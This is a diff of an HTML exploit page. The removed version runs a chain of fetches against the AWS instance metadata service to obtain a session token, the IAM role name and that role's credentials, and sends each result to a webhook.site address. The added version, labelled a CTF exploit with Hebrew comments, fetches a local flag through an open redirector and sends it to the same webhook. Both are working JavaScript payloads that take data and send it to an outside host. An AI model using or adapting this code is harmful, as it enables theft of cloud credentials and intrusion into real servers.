@@ -1,62 +1,28 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Debug IMDS Exploit</title>
+  <meta charset="UTF-8" />
+  <title>CTF CORS Redirector Exploit</title>
 </head>
 <body>
-  <h1>Running Debug Tests...</h1>
+  <h1>Running CORS Redirector Exploit...</h1>
   <script>
-    // Test 1: Check if running in headless browser
-    const webdriver = navigator.webdriver ? 'true' : 'false';
-    new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=webdriver&value=' + webdriver;
+    // כתובת ה-redirector + ה-URL של הדגל שאת רוצה לגשת אליו
+    const redirectorUrl = '/redir.php?url=' + encodeURIComponent('http://127.0.0.1/flag');
 
-    // Test 2: Try to access IMDS token endpoint
-    fetch("http://169.254.169.254/latest/api/token", {
-      method: "PUT",
-      headers: {
-        "X-aws-ec2-metadata-token-ttl-seconds": "21600"
-      }
-    })
-    .then(response => response.text())
-    .then(token => {
-      new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=imds-token&value=' + encodeURIComponent(token);
-
-      // Test 3: Try to use token to fetch IAM role name
-      fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {
-        headers: {
-          "X-aws-ec2-metadata-token": token
-        }
-      })
+    fetch(redirectorUrl)
       .then(response => response.text())
-      .then(role => {
-        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=iam-role&value=' + encodeURIComponent(role);
+      .then(flagText => {
+        // שולח את הדגל שנמצא ל-webhook.site שלך
+        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?flag=' + encodeURIComponent(flagText);
 
-        // Test 4: Get creds from IAM role
-        fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role, {
-          headers: {
-            "X-aws-ec2-metadata-token": token
-          }
-        })
-        .then(response => response.text())
-        .then(creds => {
-          new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=creds&value=' + encodeURIComponent(creds);
-        })
-        .catch(err => {
-          new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=creds-error&value=' + encodeURIComponent(err.toString());
-        });
+        // גם מציג בדף שלך כדי לוודא שזה רץ
+        document.body.insertAdjacentHTML('beforeend', '<pre style="color:green;">' + flagText + '</pre>');
       })
-      .catch(err => {
-        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=role-error&value=' + encodeURIComponent(err.toString());
+      .catch(error => {
+        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?error=' + encodeURIComponent(error.toString());
+        document.body.insertAdjacentHTML('beforeend', '<p style="color:red;">Error: ' + error + '</p>');
       });
-    })
-    .catch(err => {
-      new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=token-error&value=' + encodeURIComponent(err.toString());
-    });
-
-    // Test 5: Try image load to IMDS directly
-    new Image().src = "http://169.254.169.254/latest/meta-data/hostname";
   </script>
 </body>
 </html>
